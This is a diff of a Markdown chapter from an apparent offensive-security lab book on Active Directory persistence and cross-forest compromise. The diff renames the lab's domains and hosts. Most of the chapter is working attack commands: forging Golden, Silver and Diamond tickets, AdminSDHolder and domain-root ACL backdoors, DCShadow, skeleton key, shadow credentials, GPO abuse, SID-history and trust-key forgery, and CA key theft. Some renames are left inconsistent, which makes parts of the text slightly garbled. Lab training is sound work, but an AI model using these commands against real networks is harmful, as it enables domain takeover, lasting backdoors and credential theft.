@@ -1,9 +1,9 @@
 # 12 — Persistence and Forest Compromise
 
-You have Domain Admin on `corp.local`. Now what?
+You have Domain Admin on `empire.local`. Now what?
 
 1. **Persistence** — survive a password reset, a clean reinstall of one DC, a SOC sweep, krbtgt rotation, EDR rollout.
-2. **Forest compromise** — escalate from a child domain to **Enterprise Admin** on the forest root (`root.corp`), and pivot into the **external forest** (`finance.local`) and the child domain (`eu.corp.local`).
+2. **Forest compromise** — escalate from a child domain to **Enterprise Admin** on the forest root (`trade.corp`), and pivot into the **external forest** (`rebel.local`) and the child domain (`eu.empire.local`).
 
 This chapter covers **PER-001..037** and **DF-001..040** from `PLAN.md`. It is the longest chapter in the book because persistence + cross-forest is where the long game lives, and most defenders only think one layer deep.
 
@@ -31,7 +31,7 @@ The previous chapters were about *executing* a chain. This chapter is about *not
 
 - A model of what defenders will do (reset passwords, rotate krbtgt, wipe and rebuild DCs, sweep with EDR, audit ACLs).
 - A model of what survives each of those actions.
-- An understanding of the **forest trust graph** that DVAD ships — three forests with two trusts (one external, one forest-trust) plus one parent-child relationship.
+- An understanding of the **forest trust graph** that EMPIRE ships — three forests with two trusts (one external, one forest-trust) plus one parent-child relationship.
 - The exact tooling commands to plant each backdoor without leaving the obvious fingerprints.
 
 The persistence-vs-defense calculus is asymmetric. The defender has to find every backdoor; the attacker only has to keep one alive. That's why operators stack 5–10 independent persistence mechanisms in any serious engagement.
@@ -96,8 +96,8 @@ A Golden Ticket is a forged **TGT** for the `krbtgt` realm. Because the KDC sign
 +------------------------------------------------------+
 |  TGT (forged Golden)                                 |
 |    cname:    Administrator                           |
-|    crealm:   CORP.LOCAL                              |
-|    sname:    krbtgt/CORP.LOCAL                       |
+|    crealm:   empire.local                              |
+|    sname:    krbtgt/empire.local                       |
 |    PAC.LOGON_INFO:                                   |
 |      UserId:    500                                  |
 |      GroupIds:  512 (DA), 513 (Users), 518 (Schema), |
@@ -116,21 +116,21 @@ Because the **server signature** and **KDC signature** in the PAC are both keyed
 
 ```bash
 # Step 1 — find the domain SID:
-impacket-lookupsid corp.local/peter.parker:'DVADlab2024!'@10.10.0.10 0 | head
+impacket-lookupsid empire.local/peter.parker:'EmpireLab2024!'@10.10.0.10 0 | head
 # look for "Domain SID: S-1-5-21-A-B-C"
 
 # Step 2 — forge the TGT:
 impacket-ticketer \
     -nthash <krbtgt_NT> \
     -domain-sid S-1-5-21-A-B-C \
-    -domain corp.local \
+    -domain empire.local \
     Administrator
 # → writes Administrator.ccache
 
 # Step 3 — use:
 export KRB5CCNAME=$PWD/Administrator.ccache
 klist  # should show the forged ticket
-impacket-psexec -k -no-pass corp.local/Administrator@dc01.corp.local
+impacket-psexec -k -no-pass empire.local/Administrator@coruscant.empire.local
 ```
 
 You can pass `-aesKey <hex>` instead of `-nthash` for an AES-encrypted ticket, which avoids the RC4 wire signature (see §12.2.4 below).
@@ -138,7 +138,7 @@ You can pass `-aesKey <hex>` instead of `-nthash` for an AES-encrypted ticket, w
 ### Forge with Rubeus (in-host)
 
 ```
-.\Rubeus.exe golden /user:Administrator /domain:corp.local \
+.\Rubeus.exe golden /user:Administrator /domain:empire.local \
     /sid:S-1-5-21-A-B-C /rc4:<krbtgt_NT> /id:500 \
     /groups:500,512,513,518,519,520 /ldap /ptt
 ```
@@ -148,7 +148,7 @@ You can pass `-aesKey <hex>` instead of `-nthash` for an AES-encrypted ticket, w
 ### Forge with mimikatz (legacy reference)
 
 ```
-mimikatz # kerberos::golden /user:Administrator /domain:corp.local \
+mimikatz # kerberos::golden /user:Administrator /domain:empire.local \
         /sid:S-1-5-21-A-B-C /krbtgt:<NT> /id:500 \
         /groups:500,501,512,513,518,519,520 /ptt
 ```
@@ -200,19 +200,19 @@ A Silver Ticket is a forged **TGS** for a single service. The TGS is signed with
 ### Forge
 
 ```bash
-# For MSSQL on sql01:
+# For MSSQL on kamino:
 impacket-ticketer \
-    -nthash <sql01$_NT> \
+    -nthash <kamino$_NT> \
     -domain-sid S-1-5-21-A-B-C \
-    -domain corp.local \
-    -spn 'MSSQLSvc/sql01.corp.local:1433' \
+    -domain empire.local \
+    -spn 'MSSQLSvc/kamino.empire.local:1433' \
     Administrator
 
 export KRB5CCNAME=Administrator.ccache
-impacket-mssqlclient -k corp.local/Administrator@sql01.corp.local
+impacket-mssqlclient -k empire.local/Administrator@kamino.empire.local
 ```
 
-For CIFS on a file server you supply `-spn 'cifs/file01.corp.local'`. For HTTP (WinRM/IIS) you supply `-spn 'http/file01.corp.local'`. The hash must be the account that owns the SPN — for `cifs/<host>` that's the computer account; for `MSSQLSvc/...` it could be either the computer account or a dedicated service user.
+For CIFS on a file server you supply `-spn 'cifs/scarif.empire.local'`. For HTTP (WinRM/IIS) you supply `-spn 'http/scarif.empire.local'`. The hash must be the account that owns the SPN — for `cifs/<host>` that's the computer account; for `MSSQLSvc/...` it could be either the computer account or a dedicated service user.
 
 ### Limitations
 
@@ -239,7 +239,7 @@ Hybrid Golden/legitimate. Request a *real* TGT via AS-REQ, then **decrypt** the 
 ```bash
 # Rubeus diamond uses AES256 + decrypt-modify-reencrypt flow
 .\Rubeus.exe diamond \
-    /user:peter.parker /password:'DVADlab2024!' /enctype:aes256 \
+    /user:peter.parker /password:'EmpireLab2024!' /enctype:aes256 \
     /krbkey:<krbtgt_AES256> \
     /ticketuser:Administrator /ticketuserid:500 \
     /groups:512,513,518,519,520 \
@@ -287,7 +287,7 @@ Variant of Diamond that uses **S4U2Self + U2U** to build a PAC for an arbitrary 
 
 ```bash
 # Rubeus s4u with U2U:
-.\Rubeus.exe asktgt /user:peter.parker /password:'DVADlab2024!' /enctype:aes256 /nowrap
+.\Rubeus.exe asktgt /user:peter.parker /password:'EmpireLab2024!' /enctype:aes256 /nowrap
 .\Rubeus.exe s4u /self /impersonateuser:Administrator /nowrap \
     /altservice:krbtgt /ticket:<base64_TGT> /opsec
 ```
@@ -328,7 +328,7 @@ Many orgs never rotate krbtgt at all — the operational pain is real, and "it'l
 
 ### Per-forest separation
 
-Each domain has its own `krbtgt`. Compromising `krbtgt@corp.local` does NOT compromise `krbtgt@root.corp` or `krbtgt@finance.local` — but if you have DA on corp.local you can DCSync each `krbtgt` separately if you have replication rights, which you usually do not across forest boundaries.
+Each domain has its own `krbtgt`. Compromising `krbtgt@empire.local` does NOT compromise `krbtgt@trade.corp` or `krbtgt@rebel.local` — but if you have DA on empire.local you can DCSync each `krbtgt` separately if you have replication rights, which you usually do not across forest boundaries.
 
 The cross-forest forge (DF-005) uses the **trust account** key, not krbtgt — see §12.14.
 
@@ -338,7 +338,7 @@ The cross-forest forge (DF-005) uses the **trust account** key, not krbtgt — s
 
 ### Mechanics
 
-`AdminSDHolder` is a container in `CN=System,DC=corp,DC=local`. Every ~60 minutes, the **SDProp** task on the DC holding the PDC Emulator FSMO role copies its `nTSecurityDescriptor` onto every member of every "protected" group (Domain Admins, Enterprise Admins, Schema Admins, Account Operators, Server Operators, Backup Operators, Print Operators, Replicator, krbtgt). The copy **overwrites** the existing DACL on those user objects — that's the entire point of SDProp: keep privileged users from having ACLs delegated away.
+`AdminSDHolder` is a container in `CN=System,DC=empire,DC=local`. Every ~60 minutes, the **SDProp** task on the DC holding the PDC Emulator FSMO role copies its `nTSecurityDescriptor` onto every member of every "protected" group (Domain Admins, Enterprise Admins, Schema Admins, Account Operators, Server Operators, Backup Operators, Print Operators, Replicator, krbtgt). The copy **overwrites** the existing DACL on those user objects — that's the entire point of SDProp: keep privileged users from having ACLs delegated away.
 
 If you can write the DACL on AdminSDHolder, you implant an ACE that says "steve.rogers has GenericAll on this object." Within 60 minutes (or immediately if you force SDProp), every protected user has steve.rogers as GenericAll. Reset their passwords, set shadow creds, anything you want.
 
@@ -348,21 +348,21 @@ If you can write the DACL on AdminSDHolder, you implant an ACE that says "steve.
 # Add a GenericAll ACE for steve.rogers on AdminSDHolder:
 impacket-dacledit -action 'write' -rights 'FullControl' \
     -principal 'steve.rogers' \
-    -target-dn 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' \
-    'corp.local/Administrator@10.10.0.10' -hashes :<NT>
+    -target-dn 'CN=AdminSDHolder,CN=System,DC=empire,DC=local' \
+    'empire.local/Administrator@10.10.0.10' -hashes :<NT>
 ```
 
 Or with bloodyAD:
 
 ```bash
-bloodyAD --host 10.10.0.10 -d corp.local -u Administrator -p '...' \
-    add genericAll 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' steve.rogers
+bloodyAD --host 10.10.0.10 -d empire.local -u Administrator -p '...' \
+    add genericAll 'CN=AdminSDHolder,CN=System,DC=empire,DC=local' steve.rogers
 ```
 
 Or with PowerView (on-host):
 
 ```
-PS> Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=local' \
+PS> Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=empire,DC=local' \
         -PrincipalIdentity steve.rogers -Rights All
 ```
 
@@ -371,7 +371,7 @@ PS> Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=corp,DC=l
 Don't wait an hour — kick it manually. The rootDSE operational attribute `RunProtectAdminGroupsTask=1` triggers SDProp immediately:
 
 ```powershell
-PS> Set-ADObject -Identity 'CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=corp,DC=local' \
+PS> Set-ADObject -Identity 'CN=Directory Service,CN=Windows NT,CN=Services,CN=Configuration,DC=empire,DC=local' \
         -Replace @{RunProtectAdminGroupsTask=1}
 ```
 
@@ -388,15 +388,15 @@ After SDProp runs, every protected user has peter.parker's ACE. Confirm with:
 
 ```bash
 impacket-dacledit -action 'read' \
-    -target-dn 'CN=Administrator,CN=Users,DC=corp,DC=local' \
-    'corp.local/peter.parker@10.10.0.10' -hashes :<alice_NT>
+    -target-dn 'CN=Administrator,CN=Users,DC=empire,DC=local' \
+    'empire.local/peter.parker@10.10.0.10' -hashes :<alice_NT>
 ```
 
 You should see your ACE near the bottom. Then:
 
 ```bash
 # Reset Administrator's password — you have FullControl on the user object:
-net rpc password 'Administrator' 'NewPass1!' -U corp.local/peter.parker%'<alice_pw>' -S 10.10.0.10
+net rpc password 'Administrator' 'NewPass1!' -U empire.local/peter.parker%'<alice_pw>' -S 10.10.0.10
 ```
 
 ### Reverse-style: AdminSDHolder ACL replicates
@@ -432,7 +432,7 @@ Because the changes come through the replication path (DRS_REPLICA_SYNC + IDL_DR
 ```
 mimikatz # !+                  # load mimidrv.sys (kernel driver)
 mimikatz # !processtoken       # elevate to SYSTEM
-mimikatz # lsadump::dcshadow /object:CN=peter.parker,CN=Users,DC=corp,DC=local \
+mimikatz # lsadump::dcshadow /object:CN=peter.parker,CN=Users,DC=empire,DC=local \
                               /attribute:primaryGroupID /value:519
 # (mimikatz prints "** Server: <fake DC> registered" and listens)
 
@@ -488,9 +488,9 @@ mimikatz # misc::skeleton
 Then anywhere in the domain:
 
 ```bash
-impacket-psexec corp.local/Administrator:mimikatz@dc01.corp.local   # works (skeleton)
-impacket-psexec corp.local/Administrator:'<real_pw>'@dc01.corp.local # still works (real pw)
-impacket-psexec corp.local/peter.parker:mimikatz@dc01.corp.local            # works for ANY user
+impacket-psexec empire.local/Administrator:mimikatz@coruscant.empire.local   # works (skeleton)
+impacket-psexec empire.local/Administrator:'<real_pw>'@coruscant.empire.local # still works (real pw)
+impacket-psexec empire.local/peter.parker:mimikatz@coruscant.empire.local            # works for ANY user
 ```
 
 ### Scope
@@ -557,10 +557,10 @@ Plant a `msDS-KeyCredentialLink` on a protected user. Even after AdminSDHolder r
 
 ```bash
 # Plant:
-certipy shadow auto -u peter.parker@corp.local -p '...' -account 'Administrator' -dc-ip 10.10.0.10
+certipy shadow auto -u peter.parker@empire.local -p '...' -account 'Administrator' -dc-ip 10.10.0.10
 
 # Or manually with explicit add + save device key:
-certipy shadow add -u peter.parker@corp.local -p '...' -account 'Administrator' \
+certipy shadow add -u peter.parker@empire.local -p '...' -account 'Administrator' \
     -dc-ip 10.10.0.10 -out admin-keycred
 # Save admin-keycred.pem and admin-keycred.cer
 
@@ -601,7 +601,7 @@ Wait for next gpupdate (~90 min default + 0-30min random offset) or force on a v
 ### Linux-side: pyGPOAbuse
 
 ```bash
-pygpoabuse.py corp.local/Administrator:'...'@10.10.0.10 \
+pygpoabuse.py empire.local/Administrator:'...'@10.10.0.10 \
     --gpo-id '{31B2F340-016D-11D2-945F-00C04FB984F9}' \
     --command 'net group "Domain Admins" peter.parker /add /domain'
 ```
@@ -610,7 +610,7 @@ The GUID is the GPO ID from `gpme.msc` or `Get-GPO -All | select DisplayName,Id`
 
 ### What gets persisted where
 
-A GPO is a folder under `\\corp.local\SYSVOL\corp.local\Policies\{GUID}\`:
+A GPO is a folder under `\\empire.local\SYSVOL\empire.local\Policies\{GUID}\`:
 ```
 {GUID}\
   GPT.INI                       # version metadata
@@ -655,7 +655,7 @@ If you can write `sIDHistory` directly (via DCShadow, or because you're DA in a 
 ### Inject via DCShadow
 
 ```
-mimikatz # lsadump::dcshadow /object:CN=peter.parker,CN=Users,DC=corp,DC=local \
+mimikatz # lsadump::dcshadow /object:CN=peter.parker,CN=Users,DC=empire,DC=local \
     /attribute:sIDHistory /value:S-1-5-21-<rootSID>-519
 mimikatz # lsadump::dcshadow /push
 ```
@@ -667,8 +667,8 @@ You don't even need to write to AD — forge a Golden with `ExtraSids` in the PA
 ```bash
 impacket-ticketer \
     -nthash <krbtgt_NT> \
-    -domain-sid S-1-5-21-CORP \
-    -domain corp.local \
+    -domain-sid S-1-5-21-EMPIRE \
+    -domain empire.local \
     -extra-sid S-1-5-21-<rootSID>-519 \
     Administrator
 ```
@@ -680,15 +680,15 @@ Now peter.parker's PAC carries Enterprise Admins anywhere in the forest — unti
 | Trust type | Default SID filter | Bypassable? |
 |---|---|---|
 | Intra-forest (parent–child, tree–root) | **NO** (forest is one security boundary by design) | n/a |
-| Forest trust (separate forests, transitive) | **YES** (`QUARANTINED_DOMAIN` bit) | Yes if admin sets `netdom trust /enablesidhistory:Yes` (DVAD does this for `finance.local`) |
+| Forest trust (separate forests, transitive) | **YES** (`QUARANTINED_DOMAIN` bit) | Yes if admin sets `netdom trust /enablesidhistory:Yes` (EMPIRE does this for `rebel.local`) |
 | External trust (non-transitive, one or two-way) | **YES** | Same flag |
 | Realm trust (to non-AD Kerberos realm) | YES | configurable |
 | Shortcut trust | inherits forest behavior | n/a |
 
-In the DVAD lab:
-- `corp.local` ↔ `root.corp` is an **intra-forest** parent–child → SID filter OFF by design → SID history injection works.
-- `corp.local` ↔ `finance.local` is a **forest trust** with SID filtering deliberately weakened → works.
-- `corp.local` ↔ `eu.corp.local` is an **intra-forest** child → SID filter OFF.
+In the EMPIRE lab:
+- `empire.local` ↔ `trade.corp` is an **intra-forest** parent–child → SID filter OFF by design → SID history injection works.
+- `empire.local` ↔ `rebel.local` is a **forest trust** with SID filtering deliberately weakened → works.
+- `empire.local` ↔ `eu.empire.local` is an **intra-forest** child → SID filter OFF.
 
 [Flag: PER-026 / DF-021]
 
@@ -703,11 +703,11 @@ A forest trust has a **trust key**: the password of the trust account (a hidden 
 ```
 +---------------------------------------------------------+
 |  Inter-realm TGT (forged)                               |
-|    crealm:   CORP.LOCAL                                 |
+|    crealm:   empire.local                                 |
 |    cname:    peter.parker                                      |
-|    sname:    krbtgt/FINANCE.LOCAL                       |
+|    sname:    krbtgt/rebel.local                       |
 |    PAC.LOGON_INFO.UserId:    peter.parker's RID                |
-|    PAC.LOGON_INFO.ExtraSids: S-1-5-21-FINANCE-519       |
+|    PAC.LOGON_INFO.ExtraSids: S-1-5-21-REBEL-519       |
 |    Server sig:               HMAC(trust_key, ...)       |
 |    KDC sig:                  HMAC(trust_key, ...)       |
 |    enc-part:                 AES256(trust_key, ...)     |
@@ -719,48 +719,48 @@ A forest trust has a **trust key**: the password of the trust account (a hidden 
 DCSync the trust object — its key is stored under the trust object in AD. The simplest path is `impacket-secretsdump -just-dc` which dumps all secrets including trust accounts:
 
 ```bash
-impacket-secretsdump corp.local/Administrator:'...'@10.10.0.10 -just-dc \
-    | grep -iE 'finance|FINANCE|TDO|TRUST'
+impacket-secretsdump empire.local/Administrator:'...'@10.10.0.10 -just-dc \
+    | grep -iE 'finance|REBEL|TDO|TRUST'
 ```
 
 You'll see lines like:
 
 ```
-CORP.LOCAL\FINANCE$:aes256-cts-hmac-sha1-96:<key>
-CORP.LOCAL\FINANCE$:aes128-cts-hmac-sha1-96:<key>
-CORP.LOCAL\FINANCE$:des-cbc-md5:<key>
+empire.local\REBEL$:aes256-cts-hmac-sha1-96:<key>
+empire.local\REBEL$:aes128-cts-hmac-sha1-96:<key>
+empire.local\REBEL$:des-cbc-md5:<key>
 ```
 
-`FINANCE$` is the trust account on the corp side that represents the *outbound* trust to finance.
+`REBEL$` is the trust account on the corp side that represents the *outbound* trust to finance.
 
 ### Forge and use
 
 ```bash
 impacket-ticketer \
     -nthash <trust_NT> \
-    -domain-sid S-1-5-21-CORP \
-    -domain corp.local \
-    -extra-sid S-1-5-21-FINANCE-519 \
-    -spn 'krbtgt/FINANCE.LOCAL' \
+    -domain-sid S-1-5-21-EMPIRE \
+    -domain empire.local \
+    -extra-sid S-1-5-21-REBEL-519 \
+    -spn 'krbtgt/rebel.local' \
     Administrator
 
 export KRB5CCNAME=Administrator.ccache
 
 # Use the inter-realm TGT to request a TGS for a service in finance:
 impacket-getST -k -no-pass \
-    -spn 'cifs/dc01.finance.local' \
+    -spn 'cifs/yavin4.rebel.local' \
     -dc-ip 10.20.0.10 \
-    corp.local/Administrator
+    empire.local/Administrator
 
-impacket-psexec -k -no-pass dc01.finance.local
+impacket-psexec -k -no-pass yavin4.rebel.local
 ```
 
-If SID filtering is enforced on the forest trust, the `ExtraSids` for Enterprise Admins of finance gets stripped — the auth still succeeds but you're just `Administrator@corp` in finance, which isn't admin there. DVAD removes the filter for educational purposes.
+If SID filtering is enforced on the forest trust, the `ExtraSids` for Enterprise Admins of finance gets stripped — the auth still succeeds but you're just `Administrator@corp` in finance, which isn't admin there. EMPIRE removes the filter for educational purposes.
 
 ### Variants
 
 - Use `aesKey` instead of `nthash` — quieter encryption type.
-- Forge with `crealm` = root.corp to pivot child→root (DF-001).
+- Forge with `crealm` = trade.corp to pivot child→root (DF-001).
 - Forge for the *non-default* trust direction — the trust key works in both directions.
 
 [Flag: DF-005]
@@ -769,66 +769,66 @@ If SID filtering is enforced on the forest trust, the `ExtraSids` for Enterprise
 
 ## 12.15 Child → Root domain (DF-001)
 
-`corp.local` is a child of `root.corp`. Parent–child is **within the forest**, so SID filtering does NOT apply to SID history — that's the design. The forest is the security boundary, not the domain.
+`empire.local` is a child of `trade.corp`. Parent–child is **within the forest**, so SID filtering does NOT apply to SID history — that's the design. The forest is the security boundary, not the domain.
 
 Two paths from child DA → forest root EA:
 
 ### A. krbtgt of child + SID history injection
 
 ```bash
-# You have krbtgt of corp.local (DCSync from DA).
-# Forge a Golden TGT for peter.parker@corp.local with extra-sid = root Enterprise Admins:
+# You have krbtgt of empire.local (DCSync from DA).
+# Forge a Golden TGT for peter.parker@empire.local with extra-sid = root Enterprise Admins:
 impacket-ticketer \
     -nthash <corp_krbtgt_NT> \
-    -domain-sid S-1-5-21-CORP \
-    -domain corp.local \
-    -extra-sid S-1-5-21-ROOT-519 \
+    -domain-sid S-1-5-21-EMPIRE \
+    -domain empire.local \
+    -extra-sid S-1-5-21-TRADE-519 \
     Administrator
 
 export KRB5CCNAME=Administrator.ccache
 
 # Request a TGS for a service on the root DC. The PAC carries the EA SID:
 impacket-getST -k -no-pass \
-    -spn 'cifs/dc01.root.corp' \
+    -spn 'cifs/neimoidia.trade.corp' \
     -dc-ip 10.30.0.10 \
-    'corp.local/Administrator'
+    'empire.local/Administrator'
 
-impacket-psexec -k -no-pass dc01.root.corp
+impacket-psexec -k -no-pass neimoidia.trade.corp
 ```
 
-DC of `root.corp` sees peter.parker with EA in PAC → grants admin access.
+DC of `trade.corp` sees peter.parker with EA in PAC → grants admin access.
 
 ### B. Inter-realm TGT forge
 
-If you have the parent–child trust key (DCSync `trustAuthOutgoing` between corp and root.corp):
+If you have the parent–child trust key (DCSync `trustAuthOutgoing` between corp and trade.corp):
 
 ```bash
-impacket-secretsdump corp.local/Administrator:'...'@10.10.0.10 -just-dc | grep -i 'root\.corp\|ROOT'
+impacket-secretsdump empire.local/Administrator:'...'@10.10.0.10 -just-dc | grep -i 'root\.corp\|TRADE'
 # Then ticketer with extra-sid as in DF-005.
 ```
 
 ### C. Child DA → Domain Admins of root via DCSync
 
-A subtler variant — DA in corp.local lets you DCSync against root.corp because the parent-child trust gives `Authenticated Users` from corp delegated read on root.corp's RootDSE replication metadata if (and only if) the parent–child trust has been set up *without* the standard hardening. DVAD leaves this open.
+A subtler variant — DA in empire.local lets you DCSync against trade.corp because the parent-child trust gives `Authenticated Users` from corp delegated read on trade.corp's RootDSE replication metadata if (and only if) the parent–child trust has been set up *without* the standard hardening. EMPIRE leaves this open.
 
 ```bash
-impacket-secretsdump 'corp.local/Administrator:'...'@dc01.root.corp -just-dc-user root.corp/krbtgt
+impacket-secretsdump 'empire.local/Administrator:'...'@neimoidia.trade.corp -just-dc-user trade.corp/krbtgt
 ```
 
-If this works, you now have `krbtgt@root.corp` — full Golden capability on the root domain → Enterprise Admins forest-wide.
+If this works, you now have `krbtgt@trade.corp` — full Golden capability on the root domain → Enterprise Admins forest-wide.
 
 [Flag: DF-001]
 
 ---
 
-## 12.16 Child → Sibling (DF-002): eu.corp.local
+## 12.16 Child → Sibling (DF-002): eu.empire.local
 
-`eu.corp.local` is a sibling child of `corp.local` under the same root `root.corp`. You don't need to go up-then-down — you can attack the sibling directly via Kerberoasting and ACL paths over the transitive trust chain.
+`eu.empire.local` is a sibling child of `empire.local` under the same root `trade.corp`. You don't need to go up-then-down — you can attack the sibling directly via Kerberoasting and ACL paths over the transitive trust chain.
 
 ```
-       root.corp
+       trade.corp
         /      \
-   corp.local   eu.corp.local
+   empire.local   eu.empire.local
 ```
 
 Within a forest:
@@ -836,35 +836,35 @@ Within a forest:
 - Enterprise Admins is admin everywhere.
 - Authenticated Users from one child can read most of another child's directory.
 
-### Path A — pivot through root.corp
+### Path A — pivot through trade.corp
 
-1. DF-001 to get EA on root.corp.
-2. As EA, log into dc01.eu.corp.local directly:
+1. DF-001 to get EA on trade.corp.
+2. As EA, log into deathstar.eu.empire.local directly:
 
 ```bash
-impacket-psexec root.corp/Administrator:'...'@dc01.eu.corp.local
+impacket-psexec trade.corp/Administrator:'...'@deathstar.eu.empire.local
 ```
 
 ### Path B — direct cross-child SID-history TGT
 
-Forge a Golden in corp.local with ExtraSids = `eu.corp.local Domain Admins` (RID 512 with that domain's SID), then request a TGS for `cifs/dc01.eu.corp.local` via referral:
+Forge a Golden in empire.local with ExtraSids = `eu.empire.local Domain Admins` (RID 512 with that domain's SID), then request a TGS for `cifs/deathstar.eu.empire.local` via referral:
 
 ```bash
 impacket-ticketer \
     -nthash <corp_krbtgt> \
-    -domain-sid S-1-5-21-CORP \
-    -domain corp.local \
+    -domain-sid S-1-5-21-EMPIRE \
+    -domain empire.local \
     -extra-sid S-1-5-21-EU-512 \
     Administrator
 
 export KRB5CCNAME=Administrator.ccache
-impacket-getST -k -no-pass -spn 'cifs/dc01.eu.corp.local' -dc-ip 10.10.0.11 corp.local/Administrator
-impacket-psexec -k -no-pass dc01.eu.corp.local
+impacket-getST -k -no-pass -spn 'cifs/deathstar.eu.empire.local' -dc-ip 10.10.0.11 empire.local/Administrator
+impacket-psexec -k -no-pass deathstar.eu.empire.local
 ```
 
 ### Path C — RBCD across child trust
 
-Find a computer in eu.corp.local with `msDS-AllowedToActOnBehalfOfOtherIdentity` writable from corp (forest-trust ACLs often permit this for legacy migration scenarios). Configure RBCD, then S4U2Self/S4U2Proxy for Administrator.
+Find a computer in eu.empire.local with `msDS-AllowedToActOnBehalfOfOtherIdentity` writable from corp (forest-trust ACLs often permit this for legacy migration scenarios). Configure RBCD, then S4U2Self/S4U2Proxy for Administrator.
 
 [Flag: DF-002]
 
@@ -872,18 +872,18 @@ Find a computer in eu.corp.local with `msDS-AllowedToActOnBehalfOfOtherIdentity`
 
 ## 12.17 Forest persistence via ADCS (DF-009)
 
-If `root.corp` and `corp.local` share a CA (or each forest has its own CA whose root cert is in the others' `NTAuthCertificates`), and you compromised the CA, you can issue a cert for *any* user in any forest that trusts that CA.
+If `trade.corp` and `empire.local` share a CA (or each forest has its own CA whose root cert is in the others' `NTAuthCertificates`), and you compromised the CA, you can issue a cert for *any* user in any forest that trusts that CA.
 
 ```bash
-# As DA on corp.local with the CA private key (golden cert):
-certipy ca -ca CORP-CA -u Administrator -hashes :<NT> -dc-ip 10.10.0.10 \
+# As DA on empire.local with the CA private key (golden cert):
+certipy ca -ca EMPIRE-CA -u Administrator -hashes :<NT> -dc-ip 10.10.0.10 \
     -backup
 # → exports the CA's private key + cert
 
-# Forge an "EnterpriseAdministrator" cert for root.corp:
-certipy forge -ca-pfx ca.pfx -upn 'Administrator@root.corp' \
-    -subject 'CN=Administrator,CN=Users,DC=root,DC=corp'
-# → administrator.pfx valid against root.corp because NTAuthCertificates trusts the CA
+# Forge an "EnterpriseAdministrator" cert for trade.corp:
+certipy forge -ca-pfx ca.pfx -upn 'Administrator@trade.corp' \
+    -subject 'CN=Administrator,CN=Users,DC=trade,DC=corp'
+# → administrator.pfx valid against trade.corp because NTAuthCertificates trusts the CA
 
 certipy auth -pfx administrator.pfx -dc-ip 10.30.0.10
 ```
@@ -914,7 +914,7 @@ If you become **Schema Admin**, you can modify the AD schema itself. The schema 
 ### Idea — install a backdoor attribute
 
 ```
-PS> $sch = [ADSI]'LDAP://CN=Schema,CN=Configuration,DC=root,DC=corp'
+PS> $sch = [ADSI]'LDAP://CN=Schema,CN=Configuration,DC=trade,DC=corp'
 PS> # Create a new attribute "userBackup" on User class
 PS> # Default ACL: grant peter.parker ReadProperty on it
 PS> # Use the attribute to store an encrypted password or key cred
@@ -927,7 +927,7 @@ Now `peter.parker` has a *schema-level* place to stash a key that survives any D
 The default SD of the `user` class controls the DACL applied to every *new* user object. Adding peter.parker as GenericAll to that SD means every user created from this point forward has peter.parker as GenericAll.
 
 ```
-PS> Set-ADObject -Identity 'CN=User,CN=Schema,CN=Configuration,DC=root,DC=corp' \
+PS> Set-ADObject -Identity 'CN=User,CN=Schema,CN=Configuration,DC=trade,DC=corp' \
         -Replace @{defaultSecurityDescriptor='<modified SDDL>'}
 ```
 
@@ -944,19 +944,19 @@ This is *the* canonical "I will never be removed" backdoor — it self-propagate
 
 ## 12.19 Security descriptor backdoor on Domain root (DF-014)
 
-The domain object (`DC=corp,DC=local`) has an `nTSecurityDescriptor` controlling who can do directory-wide things including DCSync. Add an ACE granting peter.parker **DS-Replication-Get-Changes** + **DS-Replication-Get-Changes-All**:
+The domain object (`DC=empire,DC=local`) has an `nTSecurityDescriptor` controlling who can do directory-wide things including DCSync. Add an ACE granting peter.parker **DS-Replication-Get-Changes** + **DS-Replication-Get-Changes-All**:
 
 ```bash
 impacket-dacledit -action 'write' \
     -rights 'DCSync' \
     -principal peter.parker \
-    -target-dn 'DC=corp,DC=local' \
-    'corp.local/Administrator@10.10.0.10' -hashes :<NT>
+    -target-dn 'DC=empire,DC=local' \
+    'empire.local/Administrator@10.10.0.10' -hashes :<NT>
 ```
 
 Now peter.parker can DCSync the domain forever — no group membership, no exposed credential. The ACE survives password resets, AdminSDHolder runs (it doesn't touch the domain object's SD), and most audits because few orgs baseline the domain root SD.
 
-A defender's only signal is 5136 on `DC=corp,DC=local` for an `nTSecurityDescriptor` change — very low volume, so easy to alert on if you remember to set it up.
+A defender's only signal is 5136 on `DC=empire,DC=local` for an `nTSecurityDescriptor` change — very low volume, so easy to alert on if you remember to set it up.
 
 [Flag: DF-014]
 
@@ -964,20 +964,20 @@ A defender's only signal is 5136 on `DC=corp,DC=local` for an `nTSecurityDescrip
 
 ## 12.20 sIDHistory injection via forest trust (DF-016)
 
-DCShadow into a corp.local user with `sIDHistory=S-1-5-21-FINANCE-519`. When that user authenticates against finance, the PAC carries the EA SID, and the finance DC honors it (subject to SID filtering).
+DCShadow into a empire.local user with `sIDHistory=S-1-5-21-REBEL-519`. When that user authenticates against finance, the PAC carries the EA SID, and the finance DC honors it (subject to SID filtering).
 
-DVAD intentionally clears `TRUST_ATTRIBUTE_QUARANTINED_DOMAIN` on the corp↔finance forest trust, which disables SID filtering.
+EMPIRE intentionally clears `TRUST_ATTRIBUTE_QUARANTINED_DOMAIN` on the corp↔finance forest trust, which disables SID filtering.
 
 ```bash
 # Set SID history:
-mimikatz # lsadump::dcshadow /object:CN=peter.parker,CN=Users,DC=corp,DC=local \
-    /attribute:sIDHistory /value:S-1-5-21-FINANCE-519
+mimikatz # lsadump::dcshadow /object:CN=peter.parker,CN=Users,DC=empire,DC=local \
+    /attribute:sIDHistory /value:S-1-5-21-REBEL-519
 mimikatz # lsadump::dcshadow /push
 
 # Now log into finance via Kerberos cross-realm:
-impacket-getTGT corp.local/peter.parker:'...'@dc01.corp.local
-impacket-getST -spn 'cifs/dc01.finance.local' -dc-ip 10.20.0.10 -k corp.local/peter.parker
-impacket-psexec -k -no-pass dc01.finance.local
+impacket-getTGT empire.local/peter.parker:'...'@coruscant.empire.local
+impacket-getST -spn 'cifs/yavin4.rebel.local' -dc-ip 10.20.0.10 -k empire.local/peter.parker
+impacket-psexec -k -no-pass yavin4.rebel.local
 ```
 
 [Flag: DF-016]
@@ -986,19 +986,19 @@ impacket-psexec -k -no-pass dc01.finance.local
 
 ## 12.21 Foreign group membership (DF-017)
 
